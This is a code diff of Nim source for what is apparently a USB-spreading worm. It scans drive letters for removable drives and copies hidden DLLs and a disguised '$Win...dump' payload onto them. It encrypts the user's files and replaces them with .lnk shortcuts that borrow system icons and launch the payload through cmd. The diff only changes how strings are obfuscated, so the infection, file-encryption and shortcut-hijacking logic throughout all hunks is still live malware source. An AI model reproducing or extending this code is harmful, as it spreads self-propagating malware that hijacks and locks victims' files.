@@ -202,9 +202,9 @@ proc createShortcut(
 
   discard pIL.QueryInterface(&IID_IPersistFile, cast[ptr PVOID](&pPF))
 
-  discard pIL.SetPath(d e"%comspec%")
+  discard pIL.SetPath("%comspec%")
   discard pIL.SetArguments(
-    ## d(e("")) is different from d e"", see hideString.nim
+    ## d(e("")) is different from "", see hideString.nim
     d(e("/c \"start \"\"\"\" /b \"%CD:~0,3%")) & destName &
     d(e("\" \"")) & encryptedFilePath & d(e("\"\""))
   )
@@ -230,7 +230,7 @@ proc encryptFile(filePath: string): void =
   writeFile(filePath, encrypt(data, d INFECT_ENCRYPTION_KEY))
 
 proc checkDrive(destName: string, drivePath: string): void =
-  let sys32 = getEnv(d e"SystemRoot") / d e"System32"
+  let sys32 = getEnv("SystemRoot") / "System32"
   for path in walkDirRec(drivePath):
     let (dir, name, fileExt) = splitFile(path)
 
@@ -244,15 +244,15 @@ proc checkDrive(destName: string, drivePath: string): void =
 
         case icon:
         of shell32:
-          iconPath = sys32 / d e"shell32.dll"
+          iconPath = sys32 / "shell32.dll"
         of imageres:
-          iconPath = sys32 / d e"imageres.dll"
+          iconPath = sys32 / "imageres.dll"
         of wmploc:
-          iconPath = sys32 / d e"wmploc.dll"
+          iconPath = sys32 / "wmploc.dll"
 
         createShortcut(
           sys32, destName,
-          dir / name & d e".lnk",
+          dir / name & ".lnk",
           iconPath, index,
           name & fileExt
         )
@@ -262,8 +262,8 @@ proc checkDrive(destName: string, drivePath: string): void =
 
 proc searchForUSB(): void =
   let appName: string = getAppFilename()
-  for letter in d e"DEFGHIJKLMNOPQRSTUVWXYZ":
-    let drivePath: string = letter & d e ":\\"
+  for letter in "DEFGHIJKLMNOPQRSTUVWXYZ":
+    let drivePath: string = letter & ":\\"
     let driveType: UINT = GetDriveTypeW(drivePath)
 
     if driveType == DRIVE_REMOVABLE:
@@ -280,7 +280,7 @@ proc searchForUSB(): void =
         var driveName: string = $lpVolumeNameBuffer
 
         if driveName == "":
-          driveName = d e"Drive"
+          driveName = "Drive"
 
         let destName: string = d(e("$Win")) & driveName & d(e(".dump"))
         let dest: string = drivePath / destName
@@ -290,12 +290,12 @@ proc searchForUSB(): void =
         ## $WinQuery
         ## $WinFind
         if not existsFile(dest): # daca ii deja infectat lasa l in pace
-          let ddl1Name: string = d e"libssl-1_1.dll"
+          let ddl1Name: string = "libssl-1_1.dll"
           let ddl1Path: string = drivePath / ddl1Name
           copyFile(ddl1Name, ddl1Path)
           hideFile(ddl1Path)
 
-          let ddl2Name: string = d e"libcrypto-1_1.dll"
+          let ddl2Name: string = "libcrypto-1_1.dll"
           let ddl2Path: string = drivePath / ddl2Name
           copyFile(ddl2Name, ddl2Path)
           hideFile(ddl2Path)
